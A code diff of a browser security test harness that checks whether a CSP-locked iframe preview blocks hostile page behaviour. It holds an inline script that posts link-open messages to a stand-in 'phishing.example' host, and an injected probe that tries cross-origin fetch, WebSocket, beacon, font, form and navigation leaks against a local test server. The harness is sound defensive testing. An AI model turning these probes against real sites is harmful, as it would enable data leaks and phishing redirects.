@@ -155,106 +155,84 @@ function ensureClip(file) {
 }
 
 function probeDocument(otherOrigin) {
+  // The inline script is the attack. The locked policy allows only the link
+  // script, so this one must not run. Markup still asks the other origin.
   return `<!doctype html><html><head><meta charset="utf-8"></head><body style="margin:0;font:16px system-ui">
-<a id="away" href="${otherOrigin}/clicked" style="display:block;padding:16px 20px">Open the other site</a>
+<a id="away" href="${otherOrigin}/clicked" style="position:fixed;left:0;top:0;z-index:2;display:block;padding:16px 20px">Open the other site</a>
 <img id="local" alt="" src="/media/dot.png" width="8" height="8">
 <audio id="localmedia" preload="auto"></audio>
+<img alt="" src="${otherOrigin}/image.png">
+<script src="${otherOrigin}/app.js"></script>
+<link rel="stylesheet" href="${otherOrigin}/app.css">
+<video src="${otherOrigin}/clip.mp4"></video>
+<audio src="${otherOrigin}/tone.wav"></audio>
 <form id="leak" action="${otherOrigin}/form" method="POST"><input name="x" value="1"></form>
 <script>
-const OTHER = ${JSON.stringify(otherOrigin)};
-function once(el, ok, bad, ms) {
-  return new Promise((resolve) => {
-    const timer = setTimeout(() => resolve("timeout"), ms);
-    const done = (value) => { clearTimeout(timer); resolve(value); };
-    el.addEventListener(ok, () => done(ok), { once: true });
-    el.addEventListener(bad, () => done(bad), { once: true });
-  });
+parent.postMessage({jsonrpc:"2.0",id:"studio-file-link-1",method:"ui/open-link",params:{url:"https://phishing.example/steal"}},"*");
+new Image().src="/media/script-ran.png";
+addEventListener("click",function(){parent.postMessage({jsonrpc:"2.0",id:"studio-file-link-9",method:"ui/open-link",params:{url:"https://phishing.example/click"}},"*");});
+</script>
+</body></html>`;
 }
-function tag(name, attrs) {
-  const el = document.createElement(name);
-  for (const key of Object.keys(attrs)) el[key] = attrs[key];
-  document.body.appendChild(el);
-  return el;
-}
-async function run() {
-  const results = {};
-  const image = tag("img", { src: OTHER + "/image.png" });
-  const script = tag("script", { src: OTHER + "/app.js" });
-  const style = tag("link", { rel: "stylesheet", href: OTHER + "/app.css" });
-  const video = tag("video", { src: OTHER + "/clip.mp4" });
-  const audio = tag("audio", { src: OTHER + "/tone.wav" });
-  const fontStyle = tag("style", {});
-  fontStyle.textContent = "@font-face{font-family:Leak;src:url(" + OTHER + "/font.woff2)}";
-  const settled = await Promise.all([
-    once(image, "load", "error", 800),
-    once(script, "load", "error", 800),
-    once(style, "load", "error", 800),
-    once(video, "loadeddata", "error", 800),
-    once(audio, "loadeddata", "error", 800),
-    fetch(OTHER + "/fetch").then(() => "ok", (error) => "threw:" + error.name),
-    new Promise((resolve) => {
+
+function attackExpression(otherOrigin) {
+  const other = JSON.stringify(otherOrigin);
+  return `(async () => {
+    const OTHER = ${other};
+    const results = {};
+    const once = (el, ok, bad, ms) => new Promise((resolve) => {
+      const timer = setTimeout(() => resolve("timeout"), ms);
+      const done = (value) => { clearTimeout(timer); resolve(value); };
+      el.addEventListener(ok, () => done(ok), { once: true });
+      el.addEventListener(bad, () => done(bad), { once: true });
+    });
+    results.fetch = await fetch(OTHER + "/fetch").then(() => "ok", (error) => "threw:" + error.name);
+    results.xhr = await new Promise((resolve) => {
       const xhr = new XMLHttpRequest();
+      const timer = setTimeout(() => resolve("timeout"), 800);
       xhr.open("GET", OTHER + "/xhr");
-      xhr.onload = () => resolve("load:" + xhr.status);
-      xhr.onerror = () => resolve("error:" + xhr.status);
+      xhr.onload = () => { clearTimeout(timer); resolve("load:" + xhr.status); };
+      xhr.onerror = () => { clearTimeout(timer); resolve("error:" + xhr.status); };
       xhr.send();
-    }),
-    new Promise((resolve) => {
+    });
+    results.websocket = await new Promise((resolve) => {
       let socket;
       try { socket = new WebSocket(OTHER.replace(/^http/, "ws") + "/ws"); }
       catch (error) { resolve("threw:" + error.name); return; }
       const timer = setTimeout(() => { try { socket.close(); } catch (error) {} resolve("timeout"); }, 800);
       socket.onerror = () => { clearTimeout(timer); resolve("error"); };
       socket.onopen = () => { clearTimeout(timer); resolve("open"); };
-    }),
-  ]);
-  results.image = settled[0];
-  results.script = settled[1];
-  results.style = settled[2];
-  results.video = settled[3];
-  results.audio = settled[4];
-  results.fetch = settled[5];
-  results.xhr = settled[6];
-  results.websocket = settled[7];
-  try { results.beacon = String(navigator.sendBeacon(OTHER + "/beacon", "x")); }
-  catch (error) { results.beacon = "threw:" + error.name; }
-  try { document.fonts.load("16px Leak"); results.font = "asked"; }
-  catch (error) { results.font = "threw:" + error.name; }
-  try { document.cookie = "a=1"; results.cookie = document.cookie || "empty"; }
-  catch (error) { results.cookie = "threw:" + error.name; }
-  try { results.parentDocument = String(parent.document); }
-  catch (error) { results.parentDocument = "threw:" + error.name; }
-  try { parent.location.href = OTHER + "/nav-parent"; results.parentNavigation = "set"; }
-  catch (error) { results.parentNavigation = "threw:" + error.name; }
-  try { top.location.href = OTHER + "/nav-top"; results.topNavigation = "set"; }
-  catch (error) { results.topNavigation = "threw:" + error.name; }
-  try { results.open = String(window.open(OTHER + "/open", "_blank")); }
-  catch (error) { results.open = "threw:" + error.name; }
-  const local = document.getElementById("local");
-  results.localImage = local.complete && local.naturalWidth > 0 ? local.naturalWidth : 0;
-  const media = document.getElementById("localmedia");
-  const localMedia = once(media, "loadeddata", "error", 2000);
-  media.src = "/media/tone.wav";
-  results.localMedia = await localMedia;
-  parent.postMessage({ method: "studio/probe", params: Object.assign({ phase: "checks", href: location.href }, results) }, "*");
-  addEventListener("message", (event) => {
-    const command = event.data;
-    if (!command || command.method !== "studio/probe-cmd") return;
-    if (command.params.action === "form") {
-      try { document.getElementById("leak").submit(); }
-      catch (error) { parent.postMessage({ method: "studio/probe", params: { phase: "form", error: error.name } }, "*"); }
-      setTimeout(() => parent.postMessage({ method: "studio/probe", params: { phase: "form-after", href: location.href } }, "*"), 300);
-    }
-    if (command.params.action === "nav") {
-      parent.postMessage({ method: "studio/probe", params: { phase: "nav-begin", href: location.href } }, "*");
-      try { location.assign(OTHER + "/nav-self"); }
-      catch (error) { parent.postMessage({ method: "studio/probe", params: { phase: "nav", error: error.name } }, "*"); }
-      setTimeout(() => parent.postMessage({ method: "studio/probe", params: { phase: "after-nav", href: location.href } }, "*"), 400);
-    }
-  });
-}
-run();
-</script></body></html>`;
+    });
+    try { results.beacon = String(navigator.sendBeacon(OTHER + "/beacon", "x")); }
+    catch (error) { results.beacon = "threw:" + error.name; }
+    try {
+      const style = document.createElement("style");
+      style.textContent = "@font-face{font-family:Leak;src:url(" + OTHER + "/font.woff2)}";
+      document.head.appendChild(style);
+      results.font = await Promise.race([
+        document.fonts.load("16px Leak").then(() => "asked", (error) => "threw:" + error.name),
+        new Promise((resolve) => setTimeout(() => resolve("timeout"), 800)),
+      ]);
+    } catch (error) { results.font = "threw:" + error.name; }
+    try { document.cookie = "a=1"; results.cookie = document.cookie || "empty"; }
+    catch (error) { results.cookie = "threw:" + error.name; }
+    try { results.parentDocument = String(parent.document); }
+    catch (error) { results.parentDocument = "threw:" + error.name; }
+    try { parent.location.href = OTHER + "/nav-parent"; results.parentNavigation = "set"; }
+    catch (error) { results.parentNavigation = "threw:" + error.name; }
+    try { top.location.href = OTHER + "/nav-top"; results.topNavigation = "set"; }
+    catch (error) { results.topNavigation = "threw:" + error.name; }
+    try { results.open = String(window.open(OTHER + "/open", "_blank")); }
+    catch (error) { results.open = "threw:" + error.name; }
+    const local = document.getElementById("local");
+    results.localImage = local && local.complete && local.naturalWidth > 0 ? local.naturalWidth : 0;
+    const media = document.getElementById("localmedia");
+    const localMedia = once(media, "loadeddata", "error", 2000);
+    media.src = "/media/tone.wav";
+    results.localMedia = await localMedia;
+    results.href = location.href;
+    return results;
+  })()`;
 }
 
 function viewerPage(kind, name, body, sourceButton) {
@@ -353,12 +331,19 @@ function connect(wsUrl) {
   const socket = new WebSocket(wsUrl);
   let nextId = 0;
   const pending = new Map();
+  const sessions = [];
   const opened = new Promise((resolve, reject) => {
     socket.addEventListener("open", () => resolve());
     socket.addEventListener("error", () => reject(new Error(`DevTools socket failed: ${wsUrl}`)));
   });
   socket.addEventListener("message", (event) => {
     const message = JSON.parse(String(event.data));
+    if (message.method === "Target.attachedToTarget" && message.params?.sessionId) {
+      sessions.push({
+        sessionId: message.params.sessionId,
+        targetInfo: message.params.targetInfo ?? {},
+      });
+    }
     if (message.id && pending.has(message.id)) {
       const { resolve, reject } = pending.get(message.id);
       pending.delete(message.id);
@@ -368,11 +353,14 @@ function connect(wsUrl) {
   });
   return {
     ready: opened,
-    send(method, params = {}) {
+    sessions,
+    send(method, params = {}, sessionId) {
       const id = ++nextId;
       return new Promise((resolve, reject) => {
         pending.set(id, { resolve, reject });
-        socket.send(JSON.stringify({ id, method, params }));
+        const payload = { id, method, params };
+        if (sessionId) payload.sessionId = sessionId;
+        socket.send(JSON.stringify(payload));
       });
     },
     close() {
@@ -381,16 +369,140 @@ function connect(wsUrl) {
   };
 }
 
-async function evaluate(cdp, expression) {
-  const result = await cdp.send("Runtime.evaluate", {
-    expression,
-    returnByValue: true,
-    awaitPromise: true,
-  });
+async function evaluate(cdp, expression, context) {
+  const target = context && typeof context === "object" && context.cdp ? context.cdp : cdp;
+  const sessionId = context && typeof context === "object" ? context.sessionId : undefined;
+  const contextId = typeof context === "number" ? context : context?.contextId;
+  const result = await target.send(
+    "Runtime.evaluate",
+    {
+      expression,
+      returnByValue: true,
+      awaitPromise: true,
+      timeout: 12000,
+      ...(contextId === undefined ? {} : { contextId }),
+    },
+    sessionId,
+  );
   if (result.exceptionDetails) {
-    throw new Error(result.exceptionDetails.text || "evaluate failed");
+    const detail = result.exceptionDetails.exception?.description || result.exceptionDetails.text || "evaluate failed";
+    throw new Error(detail);
   }
   return result.result?.value;
+}
+
+function frameUrls(frameTree) {
+  const frames = [];
+  (function walk(node) {
+    frames.push(node.frame);
+    for (const child of node.childFrames ?? []) walk(child);
+  })(frameTree);
+  return frames;
+}
+
+async function framesOn(owner, sessionId) {
+  try {
+    const { frameTree } = await owner.send("Page.getFrameTree", {}, sessionId);
+    return frameUrls(frameTree);
+  } catch (error) {
+    return [{ url: `frame-tree failed: ${error.message}` }];
+  }
+}
+
+async function lockedContextId(cdp, port) {
+  let browser = null;
+  try {
+    const version = await (await fetch(`http://127.0.0.1:${port}/json/version`)).json();
+    if (version.webSocketDebuggerUrl) {
+      browser = connect(version.webSocketDebuggerUrl);
+      await browser.ready;
+      await browser.send("Target.setDiscoverTargets", { discover: true });
+    }
+  } catch {
+    browser = null;
+  }
+  const attachedWrappers = new Set();
+  let held = null;
+  const deadline = Date.now() + 5000;
+  let last = "";
+  while (Date.now() < deadline) {
+    const pageTargets = await cdp.send("Target.getTargets").catch(() => ({ targetInfos: [] }));
+    const browserTargets = browser ? await browser.send("Target.getTargets").catch(() => ({ targetInfos: [] })) : { targetInfos: [] };
+    const pageInfos = pageTargets.targetInfos ?? [];
+    const browserInfos = browserTargets.targetInfos ?? [];
+    const pageFrame = pageInfos.find((item) => String(item.url).includes("studio-frame=page"));
+    const browserFrame = browserInfos.find((item) => String(item.url).includes("studio-frame=page"));
+    const direct = pageFrame ?? browserFrame;
+    if (direct?.targetId) {
+      const owner = pageFrame ? cdp : browser;
+      const attached = await owner.send("Target.attachToTarget", { targetId: direct.targetId, flatten: true });
+      await owner.send("Runtime.enable", {}, attached.sessionId);
+      if (owner !== cdp) {
+        cdp.extra = browser;
+        browser = null;
+      }
+      return { cdp: owner, sessionId: attached.sessionId };
+    }
+    const wrapper = pageInfos.find((item) => String(item.url).includes("studio-frame=1"))
+      ?? browserInfos.find((item) => String(item.url).includes("studio-frame=1"));
+    if (wrapper?.targetId && !attachedWrappers.has(wrapper.targetId)) {
+      attachedWrappers.add(wrapper.targetId);
+      const owner = pageInfos.some((item) => item.targetId === wrapper.targetId) ? cdp : browser;
+      const attached = await owner.send("Target.attachToTarget", { targetId: wrapper.targetId, flatten: true });
+      await owner.send("Page.enable", {}, attached.sessionId);
+      await owner.send("Runtime.enable", {}, attached.sessionId);
+      await owner.send("Target.setAutoAttach", {
+        autoAttach: true,
+        waitForDebuggerOnStart: false,
+        flatten: true,
+      }, attached.sessionId).catch(() => {});
+      held = { owner, sessionId: attached.sessionId };
+      if (owner !== cdp) {
+        cdp.extra = browser;
+        browser = null;
+      }
+    }
+    if (held) {
+      const frames = await framesOn(held.owner, held.sessionId);
+      const nested = held.owner.sessions.find((item) => String(item.targetInfo?.url ?? "").includes("studio-frame=page"));
+      last = `wrapperFrames=${frames.map((item) => item.url || "(empty)").join(" | ")} nested=${nested?.targetInfo?.url ?? ""}`;
+      if (nested?.sessionId) {
+        await held.owner.send("Runtime.enable", {}, nested.sessionId);
+        browser?.close();
+        return { cdp: held.owner, sessionId: nested.sessionId };
+      }
+      const root = frames[0];
+      const children = frames.filter((item) => item?.id && item.id !== root?.id);
+      const named = children.find((item) => String(item.url).includes("studio-frame=page"));
+      const candidate = named ?? children.find((item) => !item.url || item.url === "about:blank" || String(item.url).includes("probe.html"));
+      if (candidate) {
+        try {
+          const world = await held.owner.send(
+            "Page.createIsolatedWorld",
+            { frameId: candidate.id },
+            held.sessionId,
+          );
+          const href = await evaluate(cdp, "location.href", {
+            cdp: held.owner,
+            sessionId: held.sessionId,
+            contextId: world.executionContextId,
+          });
+          if (String(href).includes("studio-frame=page")) {
+            browser?.close();
+            return { cdp: held.owner, sessionId: held.sessionId, contextId: world.executionContextId };
+          }
+          last += ` href=${href}`;
+        } catch (error) {
+          last += ` world failed: ${error.message}`;
+        }
+      }
+    } else {
+      last = `targets=${[...pageInfos, ...browserInfos].map((item) => `${item.type}:${item.url}`).join(" | ")}`;
+    }
+    await new Promise((resolve) => setTimeout(resolve, 100));
+  }
+  browser?.close();
+  throw new Error(`no locked frame: ${last}`);
 }
 
 async function shoot(cdp, file) {
@@ -447,8 +559,10 @@ async function main() {
   const probeHtml = probeDocument(otherOrigin);
   const shots = new Map();
 
+  const assetHits = [];
   const asset = await listen((request, response) => {
     const url = new URL(request.url ?? "/", "http://127.0.0.1");
+    assetHits.push(url.pathname);
     const send = (status, body, headers) => {
       response.writeHead(status, headers);
       response.end(body);
@@ -498,6 +612,8 @@ async function main() {
   const check = (name, ok, detail) => checks.push({ name, ok: Boolean(ok), detail: detail ?? "" });
   let chrome = null;
   let cdp = null;
+  let userDir = null;
+  let contextId = null;
   try {
     const top = await rawGet(asset.port, "/file/page.html", { "Sec-Fetch-Dest": "document" });
     check("top keeps today's policy", top.headers["content-security-policy"] === TOP_POLICY, top.headers["content-security-policy"]);
@@ -508,38 +624,62 @@ async function main() {
     const locked = await rawGet(asset.port, "/file/probe.html?studio-frame=page", { "Sec-Fetch-Dest": "iframe" });
     check("locked policy matches the module", locked.headers["content-security-policy"] === preview.HTML_FILE_LOCKED_POLICY, locked.headers["content-security-policy"]);
     check("locked page has one link script", locked.body.includes("data-studio-file-links"), "");
+    const lockedPolicy = String(locked.headers["content-security-policy"]);
+    check(
+      "locked script-src is only the link script",
+      /script-src 'sha256-[^']+'/.test(lockedPolicy) && !/script-src[^;]*unsafe-inline/.test(lockedPolicy),
+      lockedPolicy,
+    );
 
     if (!fs.existsSync(CHROME)) throw new Error(`Chrome is not at ${CHROME}`);
-    chrome = await startChrome(path.join(OUTPUT, `chrome-profile-${process.pid}`));
+    userDir = path.join(OUTPUT, `chrome-profile-${process.pid}`);
+    chrome = await startChrome(userDir);
     const page = await newPage(chrome.port);
     cdp = connect(page.webSocketDebuggerUrl);
     await cdp.ready;
     await cdp.send("Page.enable");
     await cdp.send("Runtime.enable");
+    await cdp.send("Target.setAutoAttach", {
+      autoAttach: true,
+      waitForDebuggerOnStart: false,
+      flatten: true,
+    }).catch(() => {});
 
     await go(cdp, `http://127.0.0.1:${asset.port}/harness/probe`);
-    let messages = [];
-    const started = Date.now();
-    while (Date.now() - started < 8000) {
-      messages = await evaluate(cdp, "window.__messages");
-      if (messages.some((item) => item?.params?.phase === "checks")) break;
-      await new Promise((resolve) => setTimeout(resolve, 100));
+    const settleUntil = Date.now() + 3000;
+    while (Date.now() < settleUntil && !assetHits.includes("/media/dot.png")) {
+      await new Promise((resolve) => setTimeout(resolve, 50));
     }
-    const probe = messages.find((item) => item?.params?.phase === "checks")?.params ?? {};
-    const blocked = (value) => value === "error" || value === "timeout" || String(value).startsWith("threw");
-    check("other-origin image blocked", blocked(probe.image), probe.image);
-    check("other-origin script blocked", blocked(probe.script), probe.script);
-    check("other-origin stylesheet blocked", blocked(probe.style), probe.style);
-    check("other-origin video blocked", blocked(probe.video), probe.video);
-    check("other-origin audio blocked", blocked(probe.audio), probe.audio);
+    await new Promise((resolve) => setTimeout(resolve, 700));
+    let messages = await evaluate(cdp, "window.__messages");
+    const missed = (part) => !hits.some((hit) => String(hit.url).includes(part));
+    check(
+      "page script did not run",
+      !assetHits.includes("/media/script-ran.png") &&
+        !messages.some((item) => String(item?.params?.url ?? "").includes("phishing.example")),
+      assetHits.filter((hit) => hit.includes("script-ran")).join(","),
+    );
+    check("no link message before a click", !messages.some((item) => item?.method === "ui/open-link"), "");
+    check("other origin got nothing before the click", hits.length === 0, JSON.stringify(hits));
+    for (const part of ["/image.png", "/app.js", "/app.css", "/clip.mp4", "/tone.wav"]) {
+      check(`markup ${part} blocked`, missed(part), "");
+    }
+
+    try {
+      contextId = await lockedContextId(cdp, chrome.port);
+    } catch (error) {
+      throw new Error(`${error.message} ;; assetHits=${assetHits.join(",")}`);
+    }
+    const probe = await evaluate(cdp, attackExpression(otherOrigin), contextId);
     check("fetch blocked", String(probe.fetch).startsWith("threw"), probe.fetch);
-    check("xhr blocked", String(probe.xhr).startsWith("error"), probe.xhr);
+    check("xhr blocked", String(probe.xhr).startsWith("error") || String(probe.xhr).startsWith("threw"), probe.xhr);
     check("websocket blocked", probe.websocket === "error" || String(probe.websocket).startsWith("threw"), probe.websocket);
     check(
       "beacon never reached the other origin",
-      !hits.some((hit) => hit.url.includes("/beacon")),
+      missed("/beacon"),
       `sendBeacon returned ${probe.beacon}`,
     );
+    check("font never reached the other origin", missed("/font"), probe.font);
     check("document.cookie throws", String(probe.cookie).startsWith("threw"), probe.cookie);
     check("parent.document throws", String(probe.parentDocument).startsWith("threw"), probe.parentDocument);
     check("parent navigation throws", String(probe.parentNavigation).startsWith("threw"), probe.parentNavigation);
@@ -547,8 +687,7 @@ async function main() {
     check("window.open returns nothing", probe.open === "null" || String(probe.open).startsWith("threw"), probe.open);
     check("same-origin image loads", probe.localImage > 0, String(probe.localImage));
     check("same-origin audio loads", probe.localMedia === "loadeddata", probe.localMedia);
-    check("no link message before a click", !messages.some((item) => item?.method === "ui/open-link"), "");
-    check("other origin got nothing before the click", hits.length === 0, JSON.stringify(hits));
+    check("script attacks did not reach the other origin", hits.length === 0, JSON.stringify(hits));
 
     const point = { x: 120, y: 24 };
     await cdp.send("Input.dispatchMouseEvent", { type: "mouseMoved", x: point.x, y: point.y });
@@ -562,30 +701,33 @@ async function main() {
       if (opened) break;
       await new Promise((resolve) => setTimeout(resolve, 50));
     }
+    const opens = messages.filter((item) => item?.method === "ui/open-link");
     check("reader click asks the app to open the link", opened?.params?.url === `${otherOrigin}/clicked`, JSON.stringify(opened ?? null));
+    check(
+      "a click does not open any other site",
+      opens.length === 1 && opens.every((item) => item?.params?.url === `${otherOrigin}/clicked`),
+      JSON.stringify(opens),
+    );
     check("the click did not request the other origin", hits.length === 0, JSON.stringify(hits));
 
-    async function command(action, phase, waitMs) {
-      await evaluate(
-        cdp,
-        `document.querySelector("iframe").contentWindow.postMessage({method:"studio/probe-cmd",params:{action:${JSON.stringify(action)}}}, "*")`,
-      );
-      const deadline = Date.now() + waitMs;
-      while (Date.now() < deadline) {
-        messages = await evaluate(cdp, "window.__messages");
-        if (messages.some((item) => item?.params?.phase === phase)) return messages.find((item) => item?.params?.phase === phase).params;
-        await new Promise((resolve) => setTimeout(resolve, 50));
-      }
-      return null;
-    }
-    const formAfter = await command("form", "form-after", 2000);
+    const formHref = await evaluate(
+      cdp,
+      `(() => { try { document.getElementById("leak").submit(); } catch (error) { return "threw:" + error.name; } return location.href; })()`,
+      contextId,
+    );
+    await new Promise((resolve) => setTimeout(resolve, 400));
     check(
       "form submission stayed on the page",
-      Boolean(formAfter) && !String(formAfter.href).includes("/form"),
-      formAfter?.href ?? "no form-after message",
+      typeof formHref === "string" && !formHref.includes("/form"),
+      String(formHref),
     );
-    check("form did not reach the other origin", !hits.some((hit) => hit.url.includes("/form")), JSON.stringify(hits));
-    const afterNav = await command("nav", "after-nav", 2000);
+    check("form did not reach the other origin", missed("/form"), JSON.stringify(hits));
+    const navResult = await evaluate(
+      cdp,
+      `(() => { try { location.assign(${JSON.stringify(`${otherOrigin}/nav-self`)}); return location.href; } catch (error) { return "threw:" + error.name; } })()`,
+      contextId,
+    );
+    await new Promise((resolve) => setTimeout(resolve, 500));
     let navDocument = "";
     const listed = await (await fetch(`http://127.0.0.1:${chrome.port}/json/list`)).json();
     const navPage = listed.find((item) => String(item.url).includes("nav-self") && item.webSocketDebuggerUrl);
@@ -603,14 +745,14 @@ async function main() {
         navDocument = `attach failed: ${error.message}`;
       }
     }
-    const pageStillThere = Boolean(afterNav) && !String(afterNav.href).includes("/nav-self");
     const browserRefused = /ERR_|blocked|interrupted|refused/i.test(navDocument);
+    const navThrew = String(navResult).startsWith("threw");
     check(
       "own frame navigation was refused",
-      !hits.some((hit) => hit.url.includes("/nav-self")) && (pageStillThere || browserRefused),
-      pageStillThere ? afterNav.href : navDocument.replace(/\s+/g, " ").slice(0, 240),
+      missed("/nav-self") && (navThrew || browserRefused),
+      navThrew ? String(navResult) : navDocument.replace(/\s+/g, " ").slice(0, 240),
     );
-    check("navigation did not reach the other origin", !hits.some((hit) => hit.url.includes("/nav-self")), JSON.stringify(hits));
+    check("navigation did not reach the other origin", missed("/nav-self"), JSON.stringify(hits));
 
     const cover = fs.existsSync(path.join(thumbs, "ep1-en.jpg")) ? "/media/ep1-en.jpg" : "/media/dot.png";
     const videoBody = hasClip
@@ -646,9 +788,19 @@ async function main() {
     }
     check("other origin stayed at zero", hits.length === 0, JSON.stringify(hits));
   } finally {
-    fs.writeFileSync(path.join(OUTPUT, "result.json"), JSON.stringify({ checks, hits }, null, 2));
+    fs.writeFileSync(path.join(OUTPUT, "result.json"), JSON.stringify({ checks, hits, assetHits }, null, 2));
+    cdp?.extra?.close();
+    if (contextId && typeof contextId === "object" && contextId.cdp && contextId.cdp !== cdp) contextId.cdp.close();
     cdp?.close();
     stopProcess(chrome?.child);
+    await new Promise((resolve) => setTimeout(resolve, 300));
+    if (userDir) {
+      try {
+        fs.rmSync(userDir, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 });
+      } catch {
+        // A leftover Chrome profile is not a failed proof.
+      }
+    }
     asset.server.close();
     other.server.close();
   }
